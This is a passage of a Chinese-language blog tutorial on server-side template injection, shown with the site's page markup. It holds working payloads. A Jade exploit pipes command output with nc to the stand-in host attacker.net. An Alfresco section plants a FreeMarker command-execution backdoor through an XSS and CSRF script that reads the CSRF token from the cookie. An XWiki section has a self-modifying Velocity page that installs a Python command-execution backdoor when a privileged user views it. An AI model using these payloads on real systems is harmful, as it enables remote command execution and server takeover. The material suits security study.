<span class="token punctuation">-</span><span class="token code"> <span class="token function">x</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span></span>
<span class="token tag">Cannot</span> <span class="token plain-text">find module 'a'</span></code></pre>
<p>最终 exp：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span>
<span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>require</span>
<span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span></span>
<span class="token punctuation">=</span><span class="token code"> x<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'id | nc attacker.net 80'</span><span class="token punctuation">)</span></span></code></pre>
<p><img src="https://pic3.zhimg.com/80/v2-1ef32d510c3f13a531e57e5efcc43e66_720w.jpg" alt="img"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a><strong>实战</strong></h2><h2 id="Alfresco"><a href="#Alfresco" class="headerlink" title="Alfresco"></a><strong>Alfresco</strong></h2><p>Alfresco 是一个用户在线合作类的 CMS。地权限用户能通过评论区的 XSS 来得到运行该 CMS 的服务器 Shell。先前 Freemaker 的  Payload 在此处可以不加修改地利用。不过我在此处将之前的 payload 换成用了一个经典后门：</p>
<pre class=" language-text"><code class="language-text"><#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(url.getArgs())}</code></pre>
<p>底权限用户不能编辑模板。不过我们可以用 XSS+CSRF 来让管理员帮我们修改：</p>
<pre class=" language-text"><code class="language-text">tok = /Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1];
tok = decodeURIComponent(tok)
do_csrf = new XMLHttpRequest();
do_csrf.open("POST","http://"+document.domain+":8080/share/proxy/alfresco/api/node/workspace
/SpacesStore/59d3cbdc-70cb-419e-a325-759a4c307304/formprocessor",false);
do_csrf.setRequestHeader('Content-Type','application/json; charset=UTF-8');
do_csrf.setRequestHeader('Alfresco-CSRFToken',tok);
do_csrf.send('{"prop_cm_name":"folder.get.html.ftl","prop_cm_content":"&lgt;#assign
ex=\\"freemarker.template.utility.Execute\\"?new()> ${
ex(url.getArgs())}","prop_cm_description":""}');</code></pre>
<h2 id="XWiki-Enterprise"><a href="#XWiki-Enterprise" class="headerlink" title="XWiki Enterprise"></a><strong>XWiki Enterprise</strong></h2><p>XWiki 不仅支持 Velocity（有沙箱），还可以运行 Groovy 和 Python（沒有沙箱）。但是只有特权用户才能编辑后两者，我们有什么方法插入没有沙箱保护的模板呢？</p>
<p>我们来看看它的 $doc 类，有经验的读者不难推测出它的问题：</p>
<p><img src="https://pic2.zhimg.com/80/v2-b3781ab567854ee7884b1d2425df0f0d_720w.jpg" alt="img"></p>
<p>save 和 saveAsAuthor 意味着：save 保存的作者是按最后一个观看页面的人决定的（而不一定是作者）。我们就可以创建一个可以自修改的页面，当特权用户浏览时，它就修改并保存自己：</p>
<pre class=" language-velocity"><code class="language-velocity">innocent content
{{velocity}}
#if( $doc.hasAccessLevel("programming") )
  $doc.setContent("
    innocent content
    {{python}}from subprocess import check_output
    q = request.get('q') or 'true'
    q = q.split(' ')
    print ''+check_output(q)+''
    {{/python}}
  ")
  $doc.save()
#end
{{/velocity}}</code></pre>
<p>当这个页面被特权用户浏览时，后门就会被触发。之后任意用户都可以用该页面执行命令了。</p>
<p><img src="https://pic3.zhimg.com/80/v2-944d76a8db9b58f8ce98b8d521e66f6e_720w.jpg" alt="img"></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='//music/1.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='true'
        data-ci=''
        data-cs=''
        data-r=''
        data-o=''
        data-a=''
        data-d='false'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">什么是服务端模板注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%89%8B%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">模板注入的手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%EF%BC%9A%E6%8E%A2%E6%B5%8B%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">1：探测漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E6%9C%AC%E7%B1%BB"><span class="toc-number">5.</span> <span class="toc-text">文本类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%B1%BB"><span class="toc-number">6.</span> <span class="toc-text">代码类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">7.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">8.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E6%A1%A3"><span class="toc-number">9.</span> <span class="toc-text">读文档</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E7%8E%AF%E5%A2%83"><span class="toc-number">10.</span> <span class="toc-text">探环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E7%A8%8B%E5%BA%8F"><span class="toc-number">11.</span> <span class="toc-text">黑程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-number">12.</span> <span class="toc-text">案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FreeMarker"><span class="toc-number">13.</span> <span class="toc-text">FreeMarker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Velocity"><span class="toc-number">14.</span> <span class="toc-text">Velocity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smarty"><span class="toc-number">15.</span> <span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Twig"><span class="toc-number">16.</span> <span class="toc-text">Twig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Twig%EF%BC%88%E6%B2%99%E7%AE%B1%E6%A8%A1%E5%BC%8F%EF%BC%89"><span class="toc-number">17.</span> <span class="toc-text">Twig（沙箱模式）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jade"><span class="toc-number">18.</span> <span class="toc-text">Jade</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">19.</span> <span class="toc-text">实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alfresco"><span class="toc-number">20.</span> <span class="toc-text">Alfresco</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XWiki-Enterprise"><span class="toc-number">21.</span> <span class="toc-text">XWiki Enterprise</span></a></li></ol>	
        </div>
    
</div>


    </div>
</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



<script type="text/x-mathjax-config">
    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
        messageStyle: "none"
    });
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>




</html>
